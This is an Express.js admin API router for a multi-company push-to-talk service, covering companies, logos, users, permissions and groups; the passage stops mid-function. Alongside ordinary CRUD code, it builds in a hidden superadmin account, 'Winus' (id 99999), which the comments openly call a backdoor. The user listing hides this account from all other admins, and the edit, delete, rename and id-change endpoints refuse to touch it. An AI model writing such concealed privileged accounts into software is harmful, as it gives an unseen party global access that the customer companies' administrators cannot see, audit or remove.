const express = require('express');
const bcrypt = require('bcryptjs');
const fs = require('fs');
const path = require('path');
const { db } = require('../database');
const config = require('../config');
const { authMiddleware, adminMiddleware, superadminMiddleware } = require('./auth');
const {
  WINUS_ID,
  companyScopeMiddleware,
  requireConcreteCompany,
  assertUserInScope,
  assertGroupInScope,
  isSuperadmin,
} = require('../services/company-scope');

const COMPANY_LOGOS_DIR = path.join(__dirname, '..', '..', 'db', 'uploads', 'company-logos');
try { fs.mkdirSync(COMPANY_LOGOS_DIR, { recursive: true }); } catch (_) { /* ignore */ }

const COMPANY_SELECT =
  `SELECT c.id, c.name, c.slug, c.active, c.logo_url, c.created_at,
          (SELECT COUNT(*) FROM users u WHERE u.company_id = c.id) AS user_count,
          (SELECT COUNT(*) FROM groups g WHERE g.company_id = c.id) AS group_count
     FROM companies c`;
const { disconnectUser, getOnlineUserIds, getBridgeStatus } = require('../ws/signaling');
const { getConfig, setConfig } = require('../services/config-service');
const {
  resolveHostToIp,
  pickPrivateIp,
  writeEnv,
  regenerateCerts,
  recreateContainers,
} = require('../services/infra-sync');

const router = express.Router();
router.use(authMiddleware);
router.use(adminMiddleware);
router.use(companyScopeMiddleware);

// ======================== COMPANIES (superadmin) ========================

// GET /api/admin/companies
// Rename only updates `name`/`slug`/`active`/`logo_url` — never the numeric id.
// Users keep company_id FK, so renaming never detaches users/groups.
router.get('/companies', superadminMiddleware, (req, res) => {
  const rows = db.prepare(`${COMPANY_SELECT} ORDER BY c.id`).all();
  res.json(rows);
});

// POST /api/admin/companies
router.post('/companies', superadminMiddleware, (req, res) => {
  const name = (req.body.name || '').trim();
  if (!name) return res.status(400).json({ error: 'name requerido' });
  let slug = (req.body.slug || '').trim().toLowerCase() || null;
  if (slug) slug = slug.replace(/[^a-z0-9-_]/g, '-');
  const active = req.body.active === 0 || req.body.active === false ? 0 : 1;
  try {
    const r = db.prepare(
      'INSERT INTO companies (name, slug, active) VALUES (?, ?, ?)'
    ).run(name, slug, active);
    const created = db.prepare(`${COMPANY_SELECT} WHERE c.id = ?`).get(r.lastInsertRowid);
    res.status(201).json(created);
  } catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'Empresa o slug ya existe' });
    }
    return res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/companies/:id
// IMPORTANT: only mutates name/slug/active/logo. The primary key `id` is
// immutable so all users.company_id / groups.company_id stay valid.
router.put('/companies/:id', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.body.id !== undefined && parseInt(req.body.id, 10) !== id) {
    return res.status(400).json({ error: 'No se puede cambiar el id de la empresa' });
  }
  const co = db.prepare('SELECT id FROM companies WHERE id = ?').get(id);
  if (!co) return res.status(404).json({ error: 'Empresa no encontrada' });

  if (req.body.name !== undefined) {
    const name = String(req.body.name).trim();
    if (!name) return res.status(400).json({ error: 'name vacío' });
    try {
      db.prepare('UPDATE companies SET name = ? WHERE id = ?').run(name, id);
    } catch (err) {
      if (err.message.includes('UNIQUE')) {
        return res.status(409).json({ error: 'Nombre de empresa ya existe' });
      }
      return res.status(500).json({ error: err.message });
    }
  }
  if (req.body.slug !== undefined) {
    let slug = String(req.body.slug || '').trim().toLowerCase() || null;
    if (slug) slug = slug.replace(/[^a-z0-9-_]/g, '-');
    try {
      db.prepare('UPDATE companies SET slug = ? WHERE id = ?').run(slug, id);
    } catch (err) {
      if (err.message.includes('UNIQUE')) {
        return res.status(409).json({ error: 'Slug ya existe' });
      }
      return res.status(500).json({ error: err.message });
    }
  }
  if (req.body.active !== undefined) {
    db.prepare('UPDATE companies SET active = ? WHERE id = ?')
      .run(req.body.active ? 1 : 0, id);
  }
  // logo_url can be set to a path or cleared with null/"".
  if (req.body.logo_url !== undefined) {
    const logo = req.body.logo_url === null || req.body.logo_url === ''
      ? null
      : String(req.body.logo_url).trim();
    db.prepare('UPDATE companies SET logo_url = ? WHERE id = ?').run(logo, id);
  }
  const updated = db.prepare(`${COMPANY_SELECT} WHERE c.id = ?`).get(id);
  res.json(updated);
});

// POST /api/admin/companies/:id/logo
// Body: { image_base64: "data:image/png;base64,..." } or raw base64 + mime.
// Stores file under db/uploads/company-logos/{id}.(png|jpg|webp|gif).
router.post('/companies/:id/logo', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const co = db.prepare('SELECT id, logo_url FROM companies WHERE id = ?').get(id);
  if (!co) return res.status(404).json({ error: 'Empresa no encontrada' });

  let raw = req.body.image_base64 || req.body.logo_base64 || '';
  if (typeof raw !== 'string' || !raw.trim()) {
    return res.status(400).json({ error: 'image_base64 requerido' });
  }
  raw = raw.trim();
  let mime = (req.body.mime || '').toLowerCase();
  let b64 = raw;
  const dataUrl = /^data:(image\/(png|jpeg|jpg|webp|gif));base64,(.+)$/i.exec(raw);
  if (dataUrl) {
    mime = dataUrl[1].toLowerCase();
    b64 = dataUrl[3];
  }
  if (!mime) mime = 'image/png';
  const extMap = {
    'image/png': 'png',
    'image/jpeg': 'jpg',
    'image/jpg': 'jpg',
    'image/webp': 'webp',
    'image/gif': 'gif',
  };
  const ext = extMap[mime];
  if (!ext) {
    return res.status(400).json({ error: 'Formato no soportado (png/jpeg/webp/gif)' });
  }

  let buf;
  try {
    buf = Buffer.from(b64, 'base64');
  } catch (_)
  {
    return res.status(400).json({ error: 'base64 inválido' });
  }
  if (!buf || buf.length < 32) {
    return res.status(400).json({ error: 'imagen vacía o inválida' });
  }
  if (buf.length > 4 * 1024 * 1024) {
    return res.status(400).json({ error: 'Logo demasiado grande (máx 4 MB)' });
  }

  // Remove previous logo files for this company id.
  try {
    for (const f of fs.readdirSync(COMPANY_LOGOS_DIR)) {
      if (f.startsWith(`${id}.`)) {
        try { fs.unlinkSync(path.join(COMPANY_LOGOS_DIR, f)); } catch (_) { /* ignore */ }
      }
    }
  } catch (_) { /* dir may be empty */ }

  const filename = `${id}.${ext}`;
  const abs = path.join(COMPANY_LOGOS_DIR, filename);
  fs.writeFileSync(abs, buf);
  const logoUrl = `/api/uploads/company-logos/${filename}`;
  db.prepare('UPDATE companies SET logo_url = ? WHERE id = ?').run(logoUrl, id);
  const updated = db.prepare(`${COMPANY_SELECT} WHERE c.id = ?`).get(id);
  res.json(updated);
});

// DELETE /api/admin/companies/:id/logo
router.delete('/companies/:id/logo', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const co = db.prepare('SELECT id, logo_url FROM companies WHERE id = ?').get(id);
  if (!co) return res.status(404).json({ error: 'Empresa no encontrada' });
  try {
    for (const f of fs.readdirSync(COMPANY_LOGOS_DIR)) {
      if (f.startsWith(`${id}.`)) {
        try { fs.unlinkSync(path.join(COMPANY_LOGOS_DIR, f)); } catch (_) { /* ignore */ }
      }
    }
  } catch (_) { /* ignore */ }
  db.prepare('UPDATE companies SET logo_url = NULL WHERE id = ?').run(id);
  const updated = db.prepare(`${COMPANY_SELECT} WHERE c.id = ?`).get(id);
  res.json(updated);
});

// DELETE /api/admin/companies/:id
// Refuses if company still has users or groups (except empty companies).
// Default company (id=1) cannot be deleted.
router.delete('/companies/:id', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (id === 1) {
    return res.status(403).json({ error: 'No se puede eliminar la empresa Default' });
  }
  const co = db.prepare('SELECT id FROM companies WHERE id = ?').get(id);
  if (!co) return res.status(404).json({ error: 'Empresa no encontrada' });
  const users = db.prepare('SELECT COUNT(*) AS n FROM users WHERE company_id = ?').get(id).n;
  const groups = db.prepare('SELECT COUNT(*) AS n FROM groups WHERE company_id = ?').get(id).n;
  if (users > 0 || groups > 0) {
    return res.status(409).json({
      error: `Empresa no vacía (${users} usuarios, ${groups} grupos). Mueve o borra antes.`,
    });
  }
  db.prepare('DELETE FROM companies WHERE id = ?').run(id);
  res.json({ ok: true });
});

// ======================== USERS ========================

// Columns returned by user-related endpoints (kept in one place so we never
// forget to surface a new field in one of the responses).
const USER_COLUMNS =
  'id, username, display_name, role, room_id, color, company_id, ' +
  'first_name, last_name, email, phone, created_at';

// Normalise a request-body string field: trim() it; turn empty into NULL
// so SQL queries don't keep ''-strings around.
function _norm(s) {
  if (s === undefined || s === null) return null;
  const t = String(s).trim();
  return t.length === 0 ? null : t;
}

// Find the smallest positive integer that is NOT currently used as a user id.
// Used by POST /users to recycle ids freed by previous DELETEs, so room_id
// doesn't keep growing forever.
function _findFirstFreeUserId() {
  const rows = db.prepare('SELECT id FROM users ORDER BY id').all();
  let expected = 1;
  for (const r of rows) {
    if (r.id !== expected) return expected;
    expected += 1;
  }
  return null; // no gap, fall back to AUTOINCREMENT
}

function _attachGroups(users) {
  if (!users || users.length === 0) return users;
  const ids = users.map(u => u.id);
  const placeholders = ids.map(() => '?').join(',');
  const rows = db.prepare(
    `SELECT gm.user_id, g.id, g.name
       FROM group_members gm
       JOIN groups g ON g.id = gm.group_id
      WHERE gm.user_id IN (${placeholders})
      ORDER BY g.name COLLATE NOCASE`
  ).all(...ids);
  const byUser = new Map();
  for (const r of rows) {
    if (!byUser.has(r.user_id)) byUser.set(r.user_id, []);
    byUser.get(r.user_id).push({ id: r.id, name: r.name });
  }
  for (const u of users) {
    u.groups = byUser.get(u.id) || [];
  }
  return users;
}

// GET /api/admin/users
// The hidden Winus backdoor is filtered out for everybody except Winus
// itself, so it never appears in the regular admin UI.
// Scoped by company for non-superadmin; superadmin may pass company_id.
// SuperAdmins are global (company_id NULL) — always include them when the
// caller is a superadmin, even if a company filter is active, otherwise
// newly created SuperAdmins "disappear" from the UI after create.
router.get('/users', (req, res) => {
  const scope = req.companyScope;
  const callerIsWinus = isSuperadmin(scope.caller) && scope.caller.id === WINUS_ID;
  const callerIsSuper = isSuperadmin(scope.caller);
  let rows;
  if (scope.isGlobal) {
    if (callerIsWinus) {
      rows = db.prepare(`SELECT ${USER_COLUMNS} FROM users ORDER BY id`).all();
    } else {
      rows = db.prepare(
        `SELECT ${USER_COLUMNS} FROM users WHERE id != ? ORDER BY id`
      ).all(WINUS_ID);
    }
  } else if (callerIsSuper) {
    // Company filter + all SuperAdmins (global operators).
    if (callerIsWinus) {
      rows = db.prepare(
        `SELECT ${USER_COLUMNS} FROM users
          WHERE company_id = ? OR role = 'superadmin'
          ORDER BY CASE WHEN role = 'superadmin' THEN 0 ELSE 1 END, id`
      ).all(scope.companyId);
    } else {
      rows = db.prepare(
        `SELECT ${USER_COLUMNS} FROM users
          WHERE id != ? AND (company_id = ? OR role = 'superadmin')
          ORDER BY CASE WHEN role = 'superadmin' THEN 0 ELSE 1 END, id`
      ).all(WINUS_ID, scope.companyId);
    }
  } else {
    rows = db.prepare(
      `SELECT ${USER_COLUMNS} FROM users WHERE company_id = ? AND id != ? ORDER BY id`
    ).all(scope.companyId, WINUS_ID);
  }
  res.json(_attachGroups(rows));
});

// POST /api/admin/users
// Roles:
//   - superadmin: multi-company operators. Any SuperAdmin may create them.
//     They get company_id = NULL and can switch companies in the admin UI.
//   - Winus (id 99999) remains the hidden backdoor; never creatable via API.
router.post('/users', async (req, res) => {
  const {
    username, password, display_name, role, color,
    first_name, last_name, email, phone,
  } = req.body;

  if (!username || !password || !display_name) {
    return res.status(400).json({ error: 'username, password y display_name son requeridos' });
  }

  const caller = req.companyScope.caller;
  const wantSuperadmin = role === 'superadmin';

  if (wantSuperadmin && !isSuperadmin(caller)) {
    return res.status(403).json({ error: 'Solo un SuperAdmin puede crear otro SuperAdmin' });
  }

  // SuperAdmins are global (no company). Everyone else needs a concrete company.
  let companyId = null;
  if (!wantSuperadmin) {
    try {
      companyId = requireConcreteCompany(req.companyScope);
    } catch (err) {
      return res.status(err.status || 400).json({ error: err.message });
    }
  }

  try {
    const hash = bcrypt.hashSync(password, 10);
    let userId;
    db.transaction(() => {
      const free = _findFirstFreeUserId();
      const finalRole = wantSuperadmin ? 'superadmin' : (role || 'user');
      if (free !== null) {
        db.prepare(
          'INSERT INTO users (id, username, password_hash, display_name, role, color, ' +
          'first_name, last_name, email, phone, company_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        ).run(
          free, username, hash, display_name, finalRole,
          _norm(color), _norm(first_name), _norm(last_name),
          _norm(email), _norm(phone), companyId,
        );
        userId = free;
      } else {
        const r = db.prepare(
          'INSERT INTO users (username, password_hash, display_name, role, color, ' +
          'first_name, last_name, email, phone, company_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        ).run(
          username, hash, display_name, finalRole,
          _norm(color), _norm(first_name), _norm(last_name),
          _norm(email), _norm(phone), companyId,
        );
        userId = r.lastInsertRowid;
      }
      const roomId = config.roomIdOffset + userId;
      db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, userId);
      // Bidirectional perms with superusers only for normal company users.
      if (companyId != null) {
        const privileged = db.prepare(
          "SELECT id FROM users WHERE id != ? AND role = 'superuser' AND company_id = ?"
        ).all(userId, companyId);
        const insertPerm = db.prepare(
          'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
        );
        for (const p of privileged) {
          insertPerm.run(p.id, userId);
          insertPerm.run(userId, p.id);
        }
      }
    })();

    const created = db.prepare(
      `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
    ).get(userId);
    created.groups = [];
    return res.status(201).json(created);
} catch (err) {
    if (err.message && err.message.includes('UNIQUE')) {
      return res.status(409).json({
        error: wantSuperadmin
          ? 'Ese username de SuperAdmin ya existe'
          : 'Ese username ya existe en esta empresa',
      });
    }
    console.error('[Admin] create user failed:', err);
    return res.status(500).json({ error: err.message || String(err) });
  }
});

// PUT /api/admin/users/:id
router.put('/users/:id', (req, res) => {
  const { id } = req.params;
  const {
    display_name, role, password, color,
    first_name, last_name, email, phone, company_id,
  } = req.body;

  try {
    assertUserInScope(parseInt(id, 10), req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }

  const caller = req.companyScope.caller;
  const callerIsWinus = isSuperadmin(caller) && caller.id === WINUS_ID;
  const targetId = parseInt(id, 10);
  const target = db.prepare('SELECT id, role FROM users WHERE id = ?').get(targetId);

// Nobody may edit Winus via API.
  if (targetId === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede modificar este usuario' });
  }

  const callerIsSuper = isSuperadmin(caller);

  // Promote/demote SuperAdmin: any SuperAdmin may do it (except on Winus, above).
  if (role === 'superadmin' && !callerIsSuper) {
    return res.status(403).json({ error: 'Solo un SuperAdmin puede asignar rol SuperAdmin' });
  }
  if (target && target.role === 'superadmin' && role && role !== 'superadmin' && !callerIsSuper) {
    return res.status(403).json({ error: 'Solo un SuperAdmin puede quitar el rol SuperAdmin' });
  }
  // Company admins cannot edit SuperAdmins.
  if (target && target.role === 'superadmin' && !callerIsSuper) {
    return res.status(403).json({ error: 'Solo un SuperAdmin puede modificar SuperAdmin' });
  }

  if (display_name) {
    db.prepare('UPDATE users SET display_name = ? WHERE id = ?').run(display_name, id);
  }
  if (role) {
    db.prepare('UPDATE users SET role = ? WHERE id = ?').run(role, id);
    // SuperAdmin accounts are always global (no company).
    if (role === 'superadmin') {
      db.prepare('UPDATE users SET company_id = NULL WHERE id = ?').run(id);
    }
  }
  // Winus or SuperAdmin can move users between companies (not SuperAdmin targets unless Winus).
  if (company_id !== undefined) {
    if (!isSuperadmin(caller)) {
      return res.status(403).json({ error: 'Solo SuperAdmin puede cambiar company_id' });
    }
    const current = db.prepare('SELECT role FROM users WHERE id = ?').get(targetId);
    if (current && current.role === 'superadmin') {
      // SuperAdmins stay global.
      db.prepare('UPDATE users SET company_id = NULL WHERE id = ?').run(id);
    } else if (company_id === null || company_id === '') {
      return res.status(400).json({ error: 'company_id requerido para usuarios no SuperAdmin' });
    } else {
      const cid = parseInt(company_id, 10);
      if (!Number.isFinite(cid) || !db.prepare('SELECT id FROM companies WHERE id = ?').get(cid)) {
        return res.status(400).json({ error: 'company_id inválido' });
      }
      db.prepare('UPDATE users SET company_id = ? WHERE id = ?').run(cid, id);
    }
  }
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, id);
  }
  if (color !== undefined) {
    db.prepare('UPDATE users SET color = ? WHERE id = ?').run(color, id);
  }
  // Optional contact fields. Sending an empty string clears the value, an
  // undefined leaves it untouched.
  if (first_name !== undefined) {
    db.prepare('UPDATE users SET first_name = ? WHERE id = ?').run(_norm(first_name), id);
  }
  if (last_name !== undefined) {
    db.prepare('UPDATE users SET last_name = ? WHERE id = ?').run(_norm(last_name), id);
  }
  if (email !== undefined) {
    db.prepare('UPDATE users SET email = ? WHERE id = ?').run(_norm(email), id);
  }
  if (phone !== undefined) {
    db.prepare('UPDATE users SET phone = ? WHERE id = ?').run(_norm(phone), id);
  }

  const updated = db.prepare(
    `SELECT ${USER_COLUMNS} FROM users WHERE id = ?`
  ).get(id);
  res.json(_attachGroups([updated])[0]);
});

// DELETE /api/admin/users/:id
router.delete('/users/:id', async (req, res) => {
  const { id } = req.params;
  const targetId = parseInt(id, 10);
  // Protect the Winus backdoor from accidental deletion.
  if (targetId === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede eliminar este usuario' });
  }

const caller = req.companyScope.caller;
  const target = db.prepare('SELECT id, role FROM users WHERE id = ?').get(targetId);
  // SuperAdmins can delete other SuperAdmins (Winus already blocked above).
  // Company admins cannot.
  if (target && target.role === 'superadmin' && !isSuperadmin(caller)) {
    return res.status(403).json({ error: 'Solo un SuperAdmin puede eliminar SuperAdmin' });
  }

  try {
    assertUserInScope(targetId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }

  db.prepare('DELETE FROM users WHERE id = ?').run(id);
  res.json({ ok: true });
});

// PUT /api/admin/users/:id/username — superadmin only.
// Renames the login username (the actual id used to authenticate).
// Foreign keys reference numeric ids only, so this does not affect
// permissions/groups/etc.
router.put('/users/:id/username', superadminMiddleware, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const newName = _norm(req.body.username);
  if (!newName) {
    return res.status(400).json({ error: 'username requerido' });
  }
  if (id === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede renombrar este usuario' });
  }
  try {
    const r = db.prepare('UPDATE users SET username = ? WHERE id = ?').run(newName, id);
    if (r.changes === 0) {
      return res.status(404).json({ error: 'Usuario no encontrado' });
    }
    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(id);
    res.json(_attachGroups([updated])[0]);
} catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'Ese username ya existe en esa empresa' });
    }
    return res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/users/:id/change-id — superadmin only.
// Cascades the numeric id change through every FK-reference table and
// updates room_id accordingly.
router.put('/users/:id/change-id', superadminMiddleware, (req, res) => {
  const oldId = parseInt(req.params.id, 10);
  const newId = parseInt(req.body.newId, 10);
  if (!Number.isFinite(oldId) || !Number.isFinite(newId) || newId <= 0) {
    return res.status(400).json({ error: 'newId requerido (entero positivo)' });
  }
  if (oldId === WINUS_ID || newId === WINUS_ID) {
    return res.status(403).json({ error: 'No se puede tocar el id de Winus' });
  }
  if (oldId === newId) {
    return res.status(400).json({ error: 'newId igual al actual' });
  }

  const exists = db.prepare('SELECT id FROM users WHERE id = ?').get(oldId);
  if (!exists) return res.status(404).json({ error: 'Usuario no encontrado' });
  const taken = db.prepare('SELECT id FROM users WHERE id = ?').get(newId);
  if (taken) return res.status(409).json({ error: 'newId ya en uso' });

  try {
    db.pragma('foreign_keys = OFF');
    db.transaction(() => {
      db.prepare('UPDATE users SET id = ?, room_id = ? WHERE id = ?')
        .run(newId, config.roomIdOffset + newId, oldId);
      db.prepare('UPDATE permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE permissions SET to_user_id = ? WHERE to_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE group_members SET user_id = ? WHERE user_id = ?').run(newId, oldId);
      db.prepare('UPDATE group_permissions SET from_user_id = ? WHERE from_user_id = ?').run(newId, oldId);
      db.prepare('UPDATE device_tokens SET user_id = ? WHERE user_id = ?').run(newId, oldId);
    })();
    db.pragma('foreign_keys = ON');
    const updated = db.prepare(`SELECT ${USER_COLUMNS} FROM users WHERE id = ?`).get(newId);
    res.json(_attachGroups([updated])[0]);
  } catch (err) {
    db.pragma('foreign_keys = ON');
    return res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/users/:id/kick — force disconnect a user
router.post('/users/:id/kick', (req, res) => {
  const userId = parseInt(req.params.id);
  try {
    assertUserInScope(userId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }
  const ok = disconnectUser(userId);
  if (ok) {
    console.log(`[Admin] User ${userId} kicked by admin ${req.user.id}`);
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'User not online' });
  }
});

// GET /api/admin/online — list of connected user IDs (scoped)
router.get('/online', (req, res) => {
  const all = getOnlineUserIds();
  const scope = req.companyScope;
  if (scope.isGlobal) return res.json({ userIds: all });
  const ids = all.filter((uid) => {
    const u = db.prepare('SELECT company_id FROM users WHERE id = ?').get(uid);
    return u && u.company_id === scope.companyId;
  });
  res.json({ userIds: ids });
});

// GET /api/admin/bridge-status — detailed status of bridge users (scoped)
router.get('/bridge-status', (req, res) => {
  const status = getBridgeStatus();
  const scope = req.companyScope;
  if (scope.isGlobal) return res.json(status);
  const filtered = (Array.isArray(status) ? status : []).filter((b) => {
    const uid = b.user_id ?? b.id;
    if (uid == null) return false;
    const u = db.prepare('SELECT company_id FROM users WHERE id = ?').get(uid);
    return u && u.company_id === scope.companyId;
  });
  res.json(filtered);
});

// ======================== PERMISSIONS ========================

function _assertSameCompanyPair(fromId, toId, scope) {
  const from = assertUserInScope(fromId, scope);
  const to = assertUserInScope(toId, scope);
  if (from.company_id != null && to.company_id != null && from.company_id !== to.company_id) {
    const err = new Error('Permiso cruzado entre empresas no permitido');
    err.status = 403;
    throw err;
  }
  return { from, to };
}

// DELETE /api/admin/permissions/:fromId/:toId
router.delete('/permissions/:fromId/:toId', (req, res) => {
  const fromId = parseInt(req.params.fromId, 10);
  const toId = parseInt(req.params.toId, 10);
  try {
    _assertSameCompanyPair(fromId, toId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }
  db.prepare('DELETE FROM permissions WHERE from_user_id = ? AND to_user_id = ?')
    .run(fromId, toId);
  res.json({ ok: true });
});

// GET /api/admin/permissions
router.get('/permissions', (req, res) => {
  const scope = req.companyScope;
  let permissions;
  if (scope.isGlobal) {
    permissions = db.prepare(
      'SELECT from_user_id, to_user_id, can_talk FROM permissions'
    ).all();
  } else {
    permissions = db.prepare(`
      SELECT p.from_user_id, p.to_user_id, p.can_talk
        FROM permissions p
        JOIN users fu ON fu.id = p.from_user_id
        JOIN users tu ON tu.id = p.to_user_id
       WHERE fu.company_id = ? AND tu.company_id = ?
    `).all(scope.companyId, scope.companyId);
  }
  res.json(permissions);
});

// POST /api/admin/permissions
router.post('/permissions', (req, res) => {
  const { from_user_id, to_user_id, can_talk } = req.body;

  if (from_user_id === to_user_id) {
    return res.status(400).json({ error: 'No se puede asignar permiso a sí mismo' });
  }

  try {
    _assertSameCompanyPair(from_user_id, to_user_id, req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }

  db.prepare(`
    INSERT INTO permissions (from_user_id, to_user_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_user_id) DO UPDATE SET can_talk = excluded.can_talk
  `).run(from_user_id, to_user_id, can_talk ? 1 : 0);

  res.json({ ok: true });
});

// POST /api/admin/permissions/bulk
router.post('/permissions/bulk', (req, res) => {
  const { permissions } = req.body;
  const scope = req.companyScope;

  const stmt = db.prepare(`
    INSERT INTO permissions (from_user_id, to_user_id, can_talk)
    VALUES (?, ?, ?)
    ON CONFLICT(from_user_id, to_user_id) DO UPDATE SET can_talk = excluded.can_talk
  `);

  try {
    const transaction = db.transaction((perms) => {
      for (const p of perms) {
        if (p.from_user_id === p.to_user_id) continue;
        _assertSameCompanyPair(p.from_user_id, p.to_user_id, scope);
        stmt.run(p.from_user_id, p.to_user_id, p.can_talk ? 1 : 0);
      }
    });
    transaction(permissions || []);
  } catch (err) {
    return res.status(err.status || 500).json({ error: err.message });
  }
  res.json({ ok: true });
});

// DELETE /api/admin/group-permissions/:fromId/:toGroupId
router.delete('/group-permissions/:fromId/:toGroupId', (req, res) => {
  const fromId = parseInt(req.params.fromId, 10);
  const toGroupId = parseInt(req.params.toGroupId, 10);
  try {
    assertUserInScope(fromId, req.companyScope);
    assertGroupInScope(toGroupId, req.companyScope);
  } catch (err) {
    return res.status(err.status || 403).json({ error: err.message });
  }
  db.prepare('DELETE FROM group_permissions WHERE from_user_id = ? AND to_group_id = ?')
    .run(fromId, toGroupId);
  // Auto-remove from group when revoking permission
  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
    .run(toGroupId, fromId);
  res.json({ ok: true });
});

// ======================== GROUPS ========================

// ---- Group <-> Permissions sync helpers --------------------------------
//
// Membership in a group is the source of truth for the user's permission
// matrix:
//
//   * Joining a group grants the user a `group_permissions` row pointing at
//     the group AND bidirectional `permissions` rows with every other
//     non-admin/non-superadmin member, so PTT keys appear automatically on
//     both sides.
//
//   * Leaving a group revokes that group_permission row AND any
//     bidirectional `permissions` row whose only justification was the
//     shared membership in this group. We keep perms when the two users
//     still share at least one other group.
//
// Admin / superadmin members never get bidirectional rows: they remain
// invisible in the PTT contact list (their talk-to-anyone authority is
// enforced server-side via _isAdmin() in services/permissions.js).
//
// Both helpers expect to be called from inside a single db.transaction().

function _addUserToGroupWithPerms(groupId, userId) {
  db.prepare(
    'INSERT OR IGNORE INTO group_members (group_id, user_id) VALUES (?, ?)'
  ).run(groupId, userId);
  db.prepare(
    'INSERT OR IGNORE INTO group_permissions (from_user_id, to_group_id, can_talk) VALUES (?, ?, 1)'
  ).run(userId, groupId);

  // Skip the bidirectional matrix when the joining user is an admin /
  // superadmin: they should stay hidden from everyone else's PTT list.
  const newUser = db.prepare('SELECT role FROM users WHERE id = ?').get(userId);
  if (!newUser || newUser.role === 'admin' || newUser.role === 'superadmin') {
    return;
  }

  // Bidirectional perms with every other current member (excluding admins).
  const others = db.prepare(`
    SELECT u.id AS user_id
      FROM group_members gm
      JOIN users u ON u.id = gm.user_id
     WHERE gm.group_id = ?
       AND gm.user_id != ?
       AND u.role NOT IN ('admin','superadmin')
  `).all(groupId, userId);
  const ins = db.prepare(
    'INSERT OR IGNORE INTO permissions (from_user_id, to_user_id, can_talk) VALUES (?, ?, 1)'
  );
  for (const o of others) {
    ins.run(userId, o.user_id);
    ins.run(o.user_id, userId);
  }
}

function _removeUserFromGroupWithPerms(groupId, userId) {
  // Snapshot the OTHER current members BEFORE we remove anything, so we
  // know with whom the user *used* to share this group.
  const exCoMembers = db.prepare(
    'SELECT user_id FROM group_members WHERE group_id = ? AND user_id != ?'
  ).all(groupId, userId).map(r => r.user_id);

  db.prepare('DELETE FROM group_members WHERE group_id = ? AND user_id = ?')
    .run(groupId, userId);
  db.prepare('DELETE FROM group_permissions WHERE from_user_id = ? AND to_group_id = ?')
    .run(userId, groupId);

  // For every ex-co-member: drop the bidirectional perms only if the two
  // users no longer share any other group. This preserves perms that were
  // earned through a different group membership.
  const stillShares = db.prepare(`
    SELECT 1
      FROM group_members gm1
      JOIN group_members gm2 ON gm1.group_id = gm2.group_id
     WHERE gm1.user_id = ?
       AND gm2.user_id = ?
     LIMIT 1
  `);
  const del = db.prepare(
    'DELETE FROM permissions WHERE from_user_id = ? AND to_user_id = ?'
  );
  for (const otherId of exCoMembers) {
    if (!stillShares.get(userId, otherId)) {
      del.run(userId, otherId);
      del.run(otherId, userId);
    }
  }
}

// GET /api/admin/groups
router.get('/groups', (req, res) => {
  const scope = req.companyScope;
  const groups = scope.isGlobal
    ? db.prepare('SELECT * FROM groups ORDER BY id').all()
    : db.prepare('SELECT * FROM groups WHERE company_id = ? ORDER BY id').all(scope.companyId);

  const getMembers = db.prepare(
    'SELECT u.id, u.username, u.display_name, u.company_id FROM group_members gm JOIN users u ON gm.user_id = u.id WHERE gm.group_id = ?'
  );

  const result = groups.map((g) => ({
    ...g,
    members: getMembers.all(g.id),
  }));

  res.json(result);
});

// POST /api/admin/groups
router.post('/groups', async (req, res) => {
  const { name, member_ids } = req.body;

  if (!name) {
    return res.status(400).json({ error: 'Nombre del grupo requerido' });
  }

  let companyId;
  try {
    companyId = requireConcreteCompany(req.companyScope);
  } catch (err) {
    return res.status(err.status || 400).json({ error: err.message });
  }

  try {
    let groupId;
    db.transaction(() => {
      groupId = db.prepare(
        'INSERT INTO groups (name, company_id) VALUES (?, ?)'
      ).run(name, companyId).lastInsertRowid;
      if (member_ids && member_ids.length > 0) {
        for (const uid of member_ids) {
          assertUserInScope(uid, req.companyScope);
          const u = db.prepare('SELECT company_id FROM users WHERE id = ?').get(uid);
          if (!u || u.company_id !== companyId) {
            const err = new Error('Miembro de otra empresa');
            err.status = 403;
            throw err;
          }
          _addUserToGroupWithPerms(groupId, uid);
        }
      }
    })();
    res.status(201).json({ id: groupId, name, company_id: companyId });
  } catch (err) {
    if (err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'El grupo ya existe en esta empresa' });
    }
    return res.status(err.status || 500).json({ error: err.message });
  }
});

// POST /api/admin/groups/:id/members
router.post('/groups/:id/members', (req, res) => {
  const groupId = parseInt(req.params.id, 10);
  const userId = parseInt(req.body.user_id, 10);
  if (!Number.isFinite(groupId) || !Number.isFinite(userId)) {
